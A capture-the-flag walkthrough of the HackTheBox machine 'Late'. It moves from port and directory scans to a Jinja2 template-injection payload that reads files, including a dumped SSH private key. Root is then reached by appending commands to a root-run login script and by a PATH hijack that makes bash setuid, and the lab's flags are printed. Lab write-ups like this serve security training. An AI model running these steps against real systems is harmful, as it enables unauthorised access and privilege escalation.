Late ip:10.10.11.156


rustscan:
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack



nmap:
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=
|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


nikto -h 10.10.11.156                   
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.11.156
+ Target Hostname:    10.10.11.156
+ Target Port:        80
+ Start Time:         2023-01-25 04:24:04 (GMT-5)
---------------------------------------------------------------------------
+ Server: nginx/1.14.0 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7890 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2023-01-25 04:33:19 (GMT-5) (555 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


gobuster dir  -u http://late.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64              
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://late.htb
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/01/25 04:28:10 Starting gobuster
===============================================================
/assets (Status: 301)
===============================================================
2023/01/25 04:32:05 Finished
===============================================================





gobuster dir  -u http://late.htb/assets/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64          
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://late.htb/assets/
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2023/01/25 04:29:38 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
===============================================================
2023/01/25 04:33:16 Finished
========================================



gobuster:


gobuster vhost  -u http://late.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 64
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://late.htb
[+] Threads:      64
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2023/01/25 04:25:22 Starting gobuster
===============================================================
Found: images.late.htb (Status: 200) [Size: 2187]
===============================================================
2023/01/25 04:25:47 Finished
===============================================================

found a virtual site: images.late.htb

Convert image to textwith Flask

Flask is a 'micro' Framework written in Python and designed to facilitate the development of Web Applications


found something interesting: it is rendering inside the HTML response:

curl images.late.htb/scanner -F file=@test.png
<p>S ~/Practice/HackTheBox/... 04:45AM O aBlac
‘kali@kali: ~ - ox

im) © pure text image - Google...) kali@ka

File Actions Edit View Help
kali@kali: ~/Downloads x _kali@kali: ~/Practice/HackTheBox/Late x _kali@kali:~ = —_kali@kali:~ *

——(kali® kali)-[~]
'_$ test

</p>                        



let's try an image with {{7*7}}
curl images.late.htb/scanner -F file=@t.png   
<p>49
</p>       

SUCCESS!!!!


using https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---remote-code-execution we can find a payload for remote code execution:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
Instead of id, we want to get a reverse shell on the system

We will modify the payload accordingly:


url images.late.htb/scanner -F file=@stti.png
<p>total 20
drwx------ 2 svc_acc svc_acc 4096 Apr  7  2022 .
drwxr-xr-x 7 svc_acc svc_acc 4096 Apr  7  2022 ..
-rw-rw-r-- 1 svc_acc svc_acc  394 Apr  7  2022 authorized_keys
-rw------- 1 svc_acc svc_acc 1679 Apr  7  2022 id_rsa
-rw-r--r-- 1 svc_acc svc_acc  394 Apr  7  2022 id_rsa.pub

</p>                  




curl images.late.htb/scanner -F file=@ssh.png 
<p>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

</p>                                                                                                                                                                                                     


save the key in a new file and give it permission, then log in to ssh using the key

kali㉿kali)-[~/Practice/HackTheBox/Late]
└─$ chmod 600 ssh_key 
                                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Practice/HackTheBox/Late]
└─$ ssh svc_acc@late.htb -i ssh_key                                                                   
The authenticity of host 'late.htb (10.10.11.156)' can't be established.
ECDSA key fingerprint is SHA256:bFNeiz1CrOE5/p6XvXGfPju6CF1h3+2nsk32t8V1Yfw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'late.htb,10.10.11.156' (ECDSA) to the list of known hosts.
svc_acc@late:~$ 

user.txt: ec7953d9a4c9fe61c95b942cd725272b



 PRIVESC:

 ╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/home/svc_acc/.gnupg/pubring.kbx                                                                                                                                                                     
/home/svc_acc/.gnupg/trustdb.gpg
/home/svc_acc/.config/lxc/config.yml
/usr/local/sbin/ssh-alert.sh
/var/log/kern.log
/var/log/syslog
/var/log/journal/68ed0714af124461afecf837a54c1b73/user-1000.journal
/var/log/journal/68ed0714af124461afecf837a54c1b73/system.journal
/var/log/auth.log
/var/log/mail.log
/var/mail/root


reading the file:
svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi



We got some interesting insights, when someone logins through ssh, it will send a mail to the root user. Also we discover it has some special permissions, the aim of that is to be able to write in “protected” places.

Let’s exploit it! I found out a simple way to do it:

First we open two shells and we log in one of them.
Where we are logged, we run the following commands:
# We copy the root in our directory
echo "cp /root/root.txt /home/svc_acc/root.txt"  >> /usr/local/sbin/ssh-alert.sh
# We add our user as the owner of the file
echo "chown svc_acc:svc_acc /home/svc_acc/root.txt" >> /usr/local/sbin/ssh-alert.sh

Then we rapidly go to the other shell, we log in and let’s see what we got:

ssh svc_acc@late.htb -i ssh_key
svc_acc@late:~$ ls
app  linpeas.sh  root.txt  user.txt
svc_acc@late:~$ cat root.txt
2ed536032a48f4bd02f093266c17db6f



root.txt: 2ed536032a48f4bd02f093266c17db6f




other way:

svc_acc@late:~$ which uname
/bin/uname
svc_acc@late:~$ cat /usr/local/sbin/uname
cat: /usr/local/sbin/uname: No such file or directory
svc_acc@late:~$ cd /usr/local/sbin
svc_acc@late:/usr/local/sbin$ ls
ssh-alert.sh
svc_acc@late:/usr/local/sbin$ touch uname
svc_acc@late:/usr/local/sbin$ nano uname
svc_acc@late:/usr/local/sbin$ cat uname
#!/bin/bash

chmod 4755 /bin/bash

svc_acc@late:/usr/local/sbin$ chmod +x /usr/local/sbin/uname 
svc_acc@late:/usr/local/sbin$ which uname
/usr/local/sbin/uname



open another ssh connection

sh svc_acc@late.htb -i ssh_key   
-bash-4.4$ whoami
svc_acc
-bash-4.4$ bash -p
bash-4.4# whoami
root
bash-4.4# cd /root
bash-4.4# ls
root.txt  scripts
bash-4.4# cat root.txt
2ed536032a48f4bd02f093266c17db6f
bash-4.4# 




